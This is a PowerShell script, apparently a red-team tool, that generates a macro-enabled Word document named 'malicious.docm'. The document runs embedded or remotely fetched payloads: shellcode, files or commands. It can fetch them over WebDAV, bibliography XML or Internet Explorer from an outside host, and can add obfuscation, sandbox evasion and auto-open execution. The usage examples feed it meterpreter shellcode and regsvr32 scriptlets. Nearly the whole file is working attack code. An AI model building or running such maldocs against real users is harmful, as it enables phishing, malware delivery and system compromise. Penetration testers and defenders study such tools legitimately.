function Invoke-MacroCreator {
	<#
	.AUTHOR
	@Arno0x0x
	
	.SYNOPSIS
	Creates an MS-Word document embedding a VBA macro with various payload delivery and execution capabilities.
	
	.DESCRIPTION
	Creates an MS-Word document embedding a VBA macro with various payload delivery and execution capabilities.
	
	The script supports three types of payload:
		1. File (any type of file: executable, script, whatever...):
			The file is saved in a local directory then called thanks to a command line specified as an argument
		2. Shellcode:
			The shellcode is loaded into memory then executed in the MS-Word process space
		3. Command to be executed
	
	Those payloads can be delivered through several delivery methods:
		1. Body:
			The payload is embedded into the body of the MS-Word document in an encoded form. Comes with a limit in terms of size of file that can be embedded.
		2. Comment:
			The payload is embedded into the comment of the MS-Word document in a base64 encoded form.
		3. WebDav:
			The payload is downloaded over a specific WebDAV covert channel (PROPFIND only) and requires a tool at the server side counter part: https://github.com/Arno0x/WebDavDelivery
			The process seen performing network traffic is 'svchost.exe'.
		4. Bibliograpy sources:
			The payload is embedded in a bibliography sources XML file and then loaded over HTTP(S). The generated 'sources.xml' file must be hosted on a web server.
			The process seen performing network traffic is 'word.exe'.
		5. HTML, using IE:
			The payload is embedded into a simple HTML file and then loaded over HTTP(S) from an Internet Explorer COM object. The generated 'index.html' file must be hosted on a web server.
			The process seen performing network traffic is 'iexplorer.exe'
	
	When a command is to be executed (File or Command payload), three different methods are available that can be choosen using the '-m' switch.
	
	[Optionnal] Obfuscation of the macro can optionnaly be applied. Obfuscation occurs on:
		1. Variable names
		2. Function names
		3. All string parameters
		
	[Optionnal] Some sandbox evasion technique can also be included. If a sandbox is being detected, the payload is not executed and the macro stops.
	
	[Optionnal] Auto open functions can be added so that the macro is executed automatically when the document is opened. That's what you want for an "effective" attack, but not for testing/debugging purposes.
	
	.PARAMETER inputFile
		[Mandatory]
		File containing the payload (any file, or a RAW shellcode, or a command line)
	
	.PARAMETER type
		[Mandatory]
		The type of payload. Values: file|shellcode|cmd
		
	.PARAMETER delivery
		[Mandatory]
		The payload delivery method. Values: comment|body|webdav|html|biblio
	
	.PARAMETER url
		[Optionnal]
		If the delivery method is 'webdav', the IP or FQDN to be used in the UNC path.
		If the delivery method is 'biblio', the full URL to download the generated 'sources.xml'
		If the delivery method is 'html', the full URL to download the generated 'index.html'
		
	.PARAMETER command
		[Optionnal]
		If the payload type is a 'file', the command line required to execute the file. It basically tells how to launch the file.
	
	.PARAMETER method
		[Optionnal]
		The command line execution method. Values: 1|2|3 - Defaults to 2.
	
	.PARAMETER obfuscate
		[Optionnal][Switch]
		Enables macro obfuscation.
	
	.PARAMETER evade
		[Optionnal][Switch]
		Enables sandbox detection and evasion technique.
	
	.PARAMETER autoOpen
		[Optionnal][Switch]
		Adds document auto open functions.
		
	.EXAMPLE
		Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:
		C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
		
		Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:
		C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
		
		Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:
		C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://server/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
		
		Executable delivered over WebDAV covert channel, using default UNC, no obfuscation, with sandbox evasion, using execution method 3:
		C:\PS> Invoke-MacroCreator -i badass.exe -p file -t webdav -c 'badass.exe' -e -m 3

		Command line embedded in the body of the MS-Word document, with obfuscation, no sandbox evasion, using execution method 1:
		C:\PS> Invoke-MacroCreator -i my_cmd.bat -p cmd -t body -o -m 1
		
		Shellcode embedded in a comment of the MS-Word document, no obfuscation, no sandbox evasion, adding auto-open functions:
		C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d comment -a
	#>
	
	[CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $True, HelpMessage="Input file containing the payload")]
		[Alias('i','input')]
        [ValidateNotNullOrEmpty()]
        [string]$inputFile,
		
		[Parameter(Mandatory = $True, HelpMessage="Type of payload")]
		[Alias('t')]
		[ValidateSet('shellcode', 'file', 'cmd')]
        [string]$type,
		
		[Parameter(Mandatory = $True, HelpMessage="Payload delivery method")]
		[Alias('d')]
		[ValidateSet('webdav', 'biblio', 'html', 'body', 'comment')]
        [string]$delivery,

		[Parameter(HelpMessage="Payload URL. Can be a 'WebDavDelivery' IP/FQDN or a 'biblio sources' URL")]
		[Alias('u')]
		[ValidateNotNullOrEmpty()]
        [string]$url,
		
		[Parameter(HelpMessage="Final command to use to execute the 'file' payload")]
		[Alias('c')]
		[ValidateNotNullOrEmpty()]
        [string]$command,

		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[Alias('m')]
		[ValidateSet(1, 2, 3)]
        [int]$method = 2,

        [Parameter(HelpMessage="Obfuscate the resulting macro")]
		[Alias('o')]
        [Switch]$obfuscate,

        [Parameter(HelpMessage="Add sandbox evasion technique")]
		[Alias('e')]
        [Switch]$evade,
		
		[Parameter(HelpMessage="Add document auto open functions for automatic execution of macro upon startup")]
		[Alias('a')]
        [Switch]$autoOpen
    )
	
	#----------------------------------------------------------------------------------------
	# Global variables
	$DEFAULT_WEBDAVDELIVERY = "192.168.52.134"
	$DEFAULT_BIBLIO_URL = "http://192.168.52.134:8000/sources.xml"
	$DEFAULT_INDEX_URL = "http://192.168.52.134:8000/index.html"
	$DEFAULT_MARKER = "Conclusion"
	
	$outWordFile = "$pwd\malicious.docm"
	$requireMSXML = $False
	
	#----------------------------------------------------------------------------------------
	# Perform arguments checking
	if (!(Test-Path $inputFile)) {
		Write-Host -ForegroundColor Red "[ERROR] File [$inputFile] not found"
		return -1 | Out-Null
	}
	
	# Retrieve the payload file name out of the payload path
	$fileName = Split-Path $inputFile -leaf
	
	if ($delivery -eq 'webdav') {
		$requireMSXML = $True
		if ($url) {
			$payloadUNC = "\\" + $url + "\" + $fileName + "\"
		}
		else {
			$payloadUNC = "\\" + $DEFAULT_WEBDAVDELIVERY + "\" + $fileName + "\"
			Write-Host -ForegroundColor Blue "[*] No WebDavDelivery UNC specified. Using the default one [$payloadUNC]"
		}
		Write-Host -ForegroundColor Blue "[INFO] You must make the file [$fileName] downloadable using the WebDavDelivery Tool (https://github.com/Arno0x/WebDavDelivery)"
	}
	
	if ($delivery -eq 'biblio' -Or $delivery -eq 'html') {
		$requireMSXML = $True
		if ($url) {
			$payloadURL = $url
		}
		else {
			$payloadURL = if ($delivery -eq 'biblio') {$DEFAULT_BIBLIO_URL} else {$DEFAULT_INDEX_URL}
			Write-Host -ForegroundColor Blue "[*] No payload URL specified. Using the default one [$payloadURL]"
		} 
	}
	
	if ($delivery -eq 'comment') {
		$requireMSXML = $True
	}
	
	if ($type -eq 'file') {
		if ($command) {
			# Prepare the final command for VBA: escape double-quote
			$finalCommand = $command.Replace('"','""')
			if ($finalCommand.length -gt 253 -And $method -eq 3) {
				Write-Host -ForegroundColor Red "[ERROR] Command execution method '3' does not support more that 253 characters. Choose another method (1 or 2)"
				return -1 | Out-Null
			}
		}
		else {
			Write-Host -ForegroundColor Red "[ERROR] You must specify the final command line to use to execute your file payload. Use the '-c' switch"
			return -1 | Out-Null
		} 
	}
	
	if ($type -eq 'cmd' -And $method -eq 3) {
		# Measure the command line size
		if ((Get-Content $inputFile | Measure-Object -word -line -character) -gt 253) {
			Write-Host -ForegroundColor Red "[ERROR] Command execution method '3' does not support more that 253 characters. Choose another method (1 or 2)"
			return -1 | Out-Null
		}
	}
	
	# Create random Caesar key if obfuscation is required
	if ($obfuscate) { $caesarKey = RandomInt 0 94 }	else {$caesarKey = 0}
		
	#----------------------------------------------------------------------------------------
	# Import Templates definition
	. $pwd\MacroCreatorTemplates.ps1
	
	#=========================================================================================
	# 										MAIN
	#=========================================================================================
	Write-Host -ForegroundColor Blue "[*] Creating [$outWordFile] file"
	$word = New-Object -ComObject Word.Application
    $wordVersion = $word.Version

    #Check for Office 2007 or Office 2003
    if (($wordVersion -eq "12.0") -or  ($wordVersion -eq "11.0")) {
        $word.DisplayAlerts = $False
    }
    else {
        $word.DisplayAlerts = "wdAlertsNone"
	}
	
	# Create the word document
	$document = $word.documents.add()
	$selection = $word.Selection 
	$selection.TypeParagraph()
	$selection.TypeText("PUT YOUR CONTENT HERE")
	
	#-----------------------------------------------------------------------------------------
	# Put the payload into the body of the Word document
	if ($delivery -eq 'body') {
		$converted = ConvertToVBAHex([IO.File]::ReadAllBytes($inputFile))
		
		$selection.TypeParagraph()
		$selection.TypeText($DEFAULT_MARKER)
		
		$selection.Font.Size = 4
		
		# VBA will not support retrieval of paragraph text in a variable if it's too large
		if ($converted.length -le 8000) {
			$selection.TypeParagraph()
			$selection.TypeText($converted)
		} else {
			$i = 0
			while ($i -lt ($converted.length)) {
				$size = if ($i+8000 -lt $converted.length) {8000} else {$converted.length-$i}
				$selection.TypeParagraph()
				$selection.TypeText($converted.Substring($i, $size))
				$i += 8000
			}
		}
	}
	
	#-----------------------------------------------------------------------------------------
	# Create the Bilbio Source file from the template
	if ($delivery -eq 'biblio') {
		$sources = $sources.Replace("PAYLOAD", [Convert]::ToBase64String([IO.File]::ReadAllBytes($inputFile)))
		$sources | Out-File -Encoding ascii "$pwd\sources.xml" -Force
		Write-Host -ForegroundColor Green "[+] Bibliography Sources XML file created [sources.xml]"
	}
	
	#-----------------------------------------------------------------------------------------
	# Create the index.html file from the template
	if ($delivery -eq 'html') {
		$index = $index.Replace("PAYLOAD", [Convert]::ToBase64String([IO.File]::ReadAllBytes($inputFile)))
		$index | Out-File -Encoding ascii "$pwd\index.html" -Force
		Write-Host -ForegroundColor Green "[+] File created [index.html]"
	}
	
	#------------------------------------------------------------------------
	# Preparing the final macro code
	#------------------------------------------------------------------------
	$headersCode = ''
	$functionsCode = ''
	$mainCode = "Sub #Launch#()`n"
	
	#---- BLOCK 1: If sandbox evasion has been required, include the corresponding module
	if ($evade) {
		$functionsCode += $evadeSandbox
		$mainCode += "`tIf #IsRunningInSandbox#() Then`n"
		$mainCode += "`t`tExit Sub`n"
		$mainCode += "`tEnd If`n"
	}
	
	#---- BLOCK 2: If obfuscation has been required, include the corresponding module
	if ($obfuscate) {
		$functionsCode += $invertCaesar
	}
	
	#---- BLOCK 3: Get the payload as a byte array, can be embedded or downloaded
	if ($delivery -eq 'body') {
		$functionsCode += $decodePayloadInBody
		$mainCode += "`tDim _payload_() As Byte`n"
		$mainCode += "`t_payload_ = #DecodePayloadInBody#(-`"$DEFAULT_MARKER`"-)`n"
	}
	
	elseif ($delivery -eq 'comment') {
		$functionsCode += $base64Decode
		$functionsCode += $decodePayloadInComment
		$mainCode += "`tDim _payload_() As Byte`n"
		$mainCode += "`t_payload_ = #DecodePayloadInComment#()`n"
	}

	
	elseif ($delivery -eq 'biblio') {
		$functionsCode += $base64Decode
		$functionsCode += $downloadBiblioSources
		$mainCode += "`tDim _payload_() As Byte`n"
		$mainCode += "`t_payload_ = #DownloadBiblioSources#(-`"$payloadURL`"-)`n"
	}
	
	elseif ($delivery -eq 'webdav') {
		$functionsCode += $base64Decode
		$functionsCode += $downloadWebDAV
		$mainCode += "`tDim _payload_() As Byte`n"
		$mainCode += "`t_payload_ = #DownloadWebDAV#(-`"$payloadUNC`"-)`n"
	}
	
	elseif ($delivery -eq 'html') {
		$functionsCode += $base64Decode
		$functionsCode += $downloadURLWithIE
		$mainCode += "`tDim _payload_() As Byte`n"
		$mainCode += "`t_payload_ = #DownloadURLWithIE#(-`"$payloadURL`"-)`n"
	}
	
	#---- BLOCK 4: Do something with the payload depending on its type
	if ($type -eq 'shellcode') {
		$headersCode += $executeShellcodeHeaders
		$functionsCode += $executeShellcode
		$mainCode += "`t#ExecuteShellcode#(_payload_)`n"
	}
	
	elseif ($type -eq 'file') {
		$functionsCode += $saveToFile
		$mainCode += "`tDim _filePath_, _finalCommand_ As String`n"
		$mainCode += "`t_filePath_ = #SaveToFile#(_payload_, -`"$fileName`"-)`n"
		$mainCode += "`t_finalCommand_ = Replace(-`"$finalCommand`"-, -`"$fileName`"-, _filePath_ )`n"
		if ($method -eq 1) {
			$functionsCode += $executeCommandOne
			$mainCode += "`t#ExecuteCommandOne#(_finalCommand_)`n"
		}
		elseif ($method -eq 2) {
			$functionsCode += $executeCommandTwo
			$mainCode += "`t#ExecuteCommandTwo#(_finalCommand_)`n"
		}
		elseif ($method -eq 3) {
			$functionsCode += $executeCommandThree
			$mainCode += "`t#ExecuteCommandThree#(_finalCommand_)`n"
		}
	}
	
	elseif ($type -eq 'cmd') {
		$mainCode += "`tDim _finalCommand_ As String`n"
		$mainCode += "`t_finalCommand_ = StrConv(_payload_, vbUnicode)`n"
		if ($method -eq 1) {
			$functionsCode += $executeCommandOne
			$mainCode += "`t#ExecuteCommandOne#(_finalCommand_)`n"
		}
		elseif ($method -eq 2) {
			$functionsCode += $executeCommandTwo
			$mainCode += "`t#ExecuteCommandTwo#(_finalCommand_)`n"
		}
		elseif ($method -eq 3) {
			$functionsCode += $executeCommandThree
			$mainCode += "`t#ExecuteCommandThree#(_finalCommand_)`n"
		}
	}
	
	#---- Finalize
	$mainCode += "End Sub`n"

	if ($autoOpen) {
		$mainCode += "Sub Auto_Open()`n"
		$mainCode += "`t#Launch#`n"
		$mainCode += "End Sub`n"
		$mainCode += "Sub AutoOpen()`n"
		$mainCode += "`t#Launch#`n"
		$mainCode += "End Sub`n"
	}
	
	#---- Concatenate the headers block, functions definition block and the main block
	$mainCode = $headersCode + $functionsCode + $mainCode
	
	#---- Normalize all functions, Subs and var names
	$mainCode = NormalizeCode $mainCode $obfuscate $caesarKey
	
	$docModule = $document.VBProject.VBComponents.Item(1)
	if ($requireMSXML) {
		# Adds MSXML6.0 reference to the VBProject - required for MSXML2.DOMDocument object
		$document.VBProject.References.AddFromGuid("{F5078F18-C551-11D3-89B9-0000F81FE221}", 6, 0) | Out-Null
		Write-Host -ForegroundColor Green "[+] Added MSXML 6.0 reference in the Word document VB project"
	}
	$docModule.CodeModule.AddFromString($mainCode)
	
	#----------------------------------------------------------------------------------------
	# Finalize: save the document as a Word with macro document
	if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0")) {
            $document.Saveas($outWordFile, 13) # wdFormatXMLDocumentMacroEnabled = 13
    }
    else {
        $document.Saveas([ref]$outWordFile, [ref]13)
    } 
	
	# Remove Author and other document information
	$document.RemoveDocumentInformation(99) # wdRDIAll = 99
	$document.Close()
	Write-Host -ForegroundColor Green "[+] Document [$outWordFile] created"

	$word.quit()
	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
	
	#----------------------------------------------------------------------------------------
	# If the payload is to be embedded into the comment of the file
	# Code below from 'Invoke-Commentator'
	if ($delivery -eq 'comment'){
		Write-Host -ForegroundColor Blue "[*] Adding payload as a comment into [$outWordFile] file"
		
		# Copy office document to temp dir
		$fileNameNoExt = [System.IO.Path]::GetFileNameWithoutExtension($outWordFile)
		$zipFile = (Join-Path $env:Temp $fileNameNoExt) + ".zip"
		Copy-Item -Path $outWordFile -Destination $zipFile -Force

		# Unzip MS Office document to temporary location
		$Destination = Join-Path $env:TEMP $fileNameNoExt
		Expand-ZIPFile $zipFile $Destination

		# Add the payload as a comment to the file properties
		$DocPropFile = Join-Path $Destination "docProps" | Join-Path -ChildPath "core.xml"
		Add-Comment $DocPropFile ([Convert]::ToBase64String([IO.File]::ReadAllBytes($inputFile)))
		
		# Zip files back up with MS Office extension
		$zipfileName = $Destination + ".zip"
		Create-ZIPFile $Destination $zipfileName

		# Delete the first created Word document
		Remove-Item -Force $outWordFile
		
		# Copy zip file back to original $outWordFile location and rename it
		Copy-Item $zipfileName $outWordFile
		
		Write-Host -ForegroundColor Green "`n[+] Added payload as a comment into [$outWordFile] file"
	}
}
	
#=========================================================================================
#									HELPERS FUNCTIONS
#=========================================================================================

#-------------------------------------------------------------------------
# Converts a bytearray of data into a VBA hex representation
function ConvertToVBAHex($data) {
	$converted = "&H"
	$converted += ($data|ForEach-Object ToString X2) -join '&H'
	return $converted
}

#-------------------------------------------------------------------------
function RandomString($length) {
	# ASCII characters only (from ASCII code 65 to 90 and from 97 to 122)
	return -join ((65..90) + (97..122) | Get-Random -Count $length | % {[char]$_})
}

#-------------------------------------------------------------------------
function RandomInt([int]$min, [int]$max) {
	return ($min..$max) | Get-Random
}

#-------------------------------------------------------------------------
# Dumb caesar encoding of an input string using a key (integer) to shift ASCII codes
function Caesar([int]$key, [string]$inputString) {
	$encrypted = ""
	foreach ($char in $inputString.ToCharArray()) {
		$num = [int][char]$char - 32 # Translate the working space, 32 being the first printable ASCII char
		$shifted = ($num + $key)%94 + 32
		
		#---- Escape some characters
		if ($shifted -eq 34) {
			$encrypted += '"{0}' -f [char]$shifted
		}
		else {
			$encrypted += [char]$shifted
		}
	}
	return $encrypted
}

#-------------------------------------------------------------------------
#	1.	Finds all variables which name is surrounder with character "_" such as "_varName_"
#		and then either removes the "_" or obfuscate its name
#	2. 	Finds all functions which name is surrounder with character "#" such as "#FunctionName#"
#		and then either removes the "#" or obfuscate its name
#	3.	Find all strings specified with surounding "-" such as '-"a string whatever"-'
#		and then either remove the '-' or obfuscate it with Caesar function
function NormalizeCode() {
	Param
	(
		[parameter(Mandatory=$true)]
		[String]$code,
		
		[parameter(Mandatory=$true)]
		[Bool]$obfuscate = $False,
		
		[parameter(Mandatory=$true)]
		[int]$key = 0
	)

	#---- Get the list of all variables
	$varList = [regex]::matches($code, '_[a-zA-Z]+?_') | % Value | Select-Object -Unique
	if ($obfuscate) {
		foreach ($var in $varList) {
			$code = $code.Replace($var, (RandomString 6))
		}
	}
	else {
		foreach ($var in $varList) { $length = $var.length; $code = $code.Replace($var, $var.Substring(1, $length-2)) }
	}
	
	#---- Get the list of all strings to obfuscate
	$stringList = [regex]::matches($code, '-\".+?\"-') | % Value | Select-Object -Unique
	if ($obfuscate) {
		foreach ($string in $stringList) {
			$length = $string.length
			$encryptedString = (Caesar $key $string.Substring(2, $length-4))
			$code = $code.Replace($string, "#InvertCaesar#($key,`"$encryptedString`")")
		}
	}
	else {
		foreach ($string in $stringList) { $length = $string.length; $code = $code.Replace($string, $string.Substring(1, $length-2)) }
	}
	
	#---- Get the list of all functions and subs
	$funcList = [regex]::matches($code, '#[a-zA-Z]+?#') | % Value | Select-Object -Unique
	if ($obfuscate) {
		foreach ($func in $funcList) {
			$code = $code.Replace($func, (RandomString 9))
		}
	}
	else {
		foreach ($func in $funcList) { $length = $func.length; $code = $code.Replace($func, $func.Substring(1, $length-2)) }
	}
	
	return $code
}

#-------------------------------------------------------------------------
# Below code taken from 'Invoke-Commentator'
function Expand-ZIPFile($file, $destination)
{
    #delete the destination folder if it already exists
    If(test-path $destination)
    {
        Remove-Item -Recurse -Force $destination
    }
    New-Item -ItemType Directory -Force -Path $destination | Out-Null

    
    #extract to the destination folder
    $shell = new-object -com shell.application
    $zip = $shell.NameSpace($file)
    $shell.namespace($destination).copyhere($zip.items())
}

#-------------------------------------------------------------------------
#Zip code is from https://serverfault.com/questions/456095/zipping-only-files-using-powershell
function Create-ZIPFile($folder, $zipfileName)
{
    # Delete the zip file if it already exists
    If(test-path $zipfileName)
    {
        Remove-Item -Force $zipfileName
    }
    set-content $zipfileName ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
    (dir $zipfileName).IsReadOnly = $false  

    $shellApplication = new-object -com shell.application
    $zipPackage = $shellApplication.NameSpace($zipfileName)

    $files = Get-ChildItem -Path $folder
    foreach($file in $files) 
    { 
            $zipPackage.CopyHere($file.FullName)
            #using this method, sometimes files can be 'skipped'
            #this 'while' loop checks each file is added before moving to the next
            while($zipPackage.Items().Item($file.name) -eq $null){
                Write-Host -ForegroundColor Yellow -NoNewline ". "
                Start-sleep -seconds 1
            }
    }
}

#-------------------------------------------------------------------------
function Add-Comment($DocPropFile, $Comment)
{

   $xmlDoc = [System.Xml.XmlDocument](Get-Content $DocPropFile);

    Try{
        # Overwrite the value of the description tag with specified comment
        $xmlDoc.coreProperties.description = $Comment
    }
    Catch {
        $nsm = New-Object System.Xml.XmlNamespaceManager($xmlDoc.nametable)
        $nsm.addnamespace("dc", $xmlDoc.coreProperties.GetNamespaceOfPrefix("dc")) 
        $nsm.addnamespace("cp", $xmlDoc.coreProperties.GetNamespaceOfPrefix("cp"))
        $newDescNode = $xmlDoc.CreateElement("dc:description",$nsm.LookupNamespace("dc")); 
        $xmlDoc.coreProperties.AppendChild($newDescNode) | Out-Null; 
        $xmlDoc.coreProperties.description = $Comment
    }

   $xmlDoc.Save($DocPropFile)
}